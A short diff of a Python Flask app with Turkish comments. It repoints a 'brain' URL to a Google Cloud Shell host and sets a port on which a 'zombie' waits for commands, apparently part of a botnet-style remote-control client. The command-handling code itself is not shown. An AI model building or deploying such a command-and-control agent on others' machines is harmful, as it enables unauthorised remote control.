@@ -8,7 +8,7 @@ app = Flask(__name__)
 
 # --- KRİTİK AYARLAR ---
 # Playit'ten aldığın o sabit linki buraya yazıyorsun
-BEYIN_URL = "http://usb-metallic.gl.joinmc.link" 
+BEYIN_URL = "https://8080-cs-776432276334-default.cs-europe-west4-fycr.cloudshell.dev" 
 ZOMBI_PORT = "5000" # Zombi bu porttan emir bekleyecek
 
 def kayit_ol():
